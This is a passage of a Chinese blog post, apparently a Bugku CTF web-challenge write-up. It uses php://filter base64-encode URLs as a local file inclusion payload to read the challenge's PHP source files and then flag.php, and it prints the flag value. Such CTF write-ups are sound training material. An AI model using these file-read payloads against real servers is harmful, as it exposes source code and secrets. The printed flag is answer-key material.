class="line"></span><br><span class="line">    move_uploaded_file($fn, <span class="string">"uploads/$imagekey.png"</span>);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: ?op=show&amp;imagekey=$imagekey"</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div class="article"&gt;</span><br><span class="line">    &lt;h2&gt;Upload your own png file&lt;/h2&gt;</span><br><span class="line">    &lt;form enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"?op=upload"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">"image"</span>&gt;Image file (max <span class="meta">&lt;?</span>=MAX_IM_SIZE;<span class="meta">?&gt;</span>x<span class="meta">&lt;?</span>=MAX_IM_SIZE;<span class="meta">?&gt;</span>): &lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">"file"</span> id=<span class="string">"image"</span> name=<span class="string">"image"</span> /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"Upload!"</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>再看一下common.php，<a href="http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=common" target="_blank" rel="noopener">http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=common</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!defined(<span class="string">'FROM_INDEX'</span>)) <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">define(<span class="string">'MAX_IM_SIZE'</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_image_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>] . $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] . time() . mt_rand());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_image</span><span class="params">($imagekey)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> !== preg_match(<span class="string">'/[0-9a-f]&#123;40&#125;/'</span>, $imagekey)) &#123;</span><br><span class="line">        fatal(<span class="string">'Invalid image key.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $im = imagecreatefrompng(<span class="string">"uploads/&#123;$imagekey&#125;.png"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!$im) &#123;</span><br><span class="line">        fatal(<span class="string">'Failed to load image.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $im;</span><br><span class="line">&#125;</span><br><span class="line">stream_wrapper_unregister (<span class="string">"zip"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看出我们上传文件首先对上传文件类型进行检查，检查是不是png类型的文件，如果是，则重定向到show.php</p>
+<p>那么我们再看看show.php的源代码</p>
+<p><a href="http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=show" target="_blank" rel="noopener">http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=show</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'common.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'imagekey'</span>])) &#123;</span><br><span class="line">    header(<span class="string">'Location: ?op=home'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$imagekey = $_GET[<span class="string">'imagekey'</span>];</span><br><span class="line">$im = load_image($imagekey);</span><br><span class="line"></span><br><span class="line">$w = imagesx($im);</span><br><span class="line">$h = imagesy($im);</span><br><span class="line"><span class="keyword">if</span>($w &gt; MAX_IM_SIZE || $h &gt; MAX_IM_SIZE)</span><br><span class="line">    fatal(<span class="string">"Invalid image dimensions."</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div class="article"&gt;</span><br><span class="line">    &lt;h2&gt;&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;&lt;img src=<span class="string">"uploads/&lt;?=$imagekey;?&gt;.png"</span> /&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;a href=<span class="string">"uploads/&lt;?=$imagekey;?&gt;.png"</span>&gt;View saved image&lt;/a&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure>
+<p>看不出所以然，即使最后上传成功文件，也没显示flag，那么直接输入op=flag，发现没有提示错误，说明有这个文件，那么就同样利用php://filter读取源代码</p>
+<p><a href="http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag" target="_blank" rel="noopener">http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag</a></p>
+<p>解码得</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$flag=<span class="string">"flag&#123;e00f8931037cbdb25f6b1d82dfe5552f&#125;"</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2018-08-11T05:43:28.693Z" itemprop="dateUpdated">2018-08-11 13:43:28</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/63286/" target="_blank" rel="external">https://Foxgrin.github.io/posts/63286/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/63286/&title=《Bugkuctf-Web(3)》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/63286/&title=《Bugkuctf-Web(3)》 — Somnus's blog&source=Bugkuctf中的Web题解(三)" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/63286/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bugkuctf-Web(3)》 — Somnus's blog&url=https://Foxgrin.github.io/posts/63286/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/63286/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/47995/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：CBC字节翻转攻击
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/22848/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：sql约束攻击">下一篇：sql约束攻击</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/63286/&title=《Bugkuctf-Web(3)》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/63286/&title=《Bugkuctf-Web(3)》 — Somnus's blog&source=Bugkuctf中的Web题解(三)" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/63286/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bugkuctf-Web(3)》 — Somnus's blog&url=https://Foxgrin.github.io/posts/63286/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/63286/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABx0lEQVR42u3aQW7DMAwEwPz/0+61QKF4SVpqAoxORuLYoxwIaanXKx7XYvz9dvXJ6mmvHQMXF3fMvd6O1T2/P3//5OqEV/fg4uKe5yYvS66TcpZPGxcX91u4VXReyHBxcb+Xmyxrku0NLi7u53PzQjOJP5LnPLZXw8XFHXDzlHLf9ZZ8FxcXt8W9iiMpQJMQ9uZXuLi4R7h5Qek1Wnoh6U07FhcXdzM3Dzfz2fdikejtuLi4R7g7GqvVIHUUjuDi4m7g5k2UfN7lzUxeo3BxcY9w58ekegFob/K4uLhnuNVYs9co7bVtbv5XXFzcbdxkWTMJTPO4JI9ZcXFxz3AnTdY8Uuk1WW82P7i4uNu48/ZJEp5WF09R3cXFxd3GzZcmTx3XaEaluLi4x7n5dbJpqT4/L3a4uLgnuZPIY1IWq0c0cHFxz3OTYlSNQnot2Gj1hIuLu4F7FcdTx7aqQQwuLu5J7uRIRE6cHOpqTgYXF3fMnTdWq8c18t+W/zlcXNxHudWWxrzJmgesy3wXFxf3w7i7Q9JyaoKLi/uv3HyTM2nNLu/HxcU9yK22WpNFT946Tb7FxcU9ya2WkmpUOlkwjfJdXFzcDvcH96VI5xkQ3fEAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
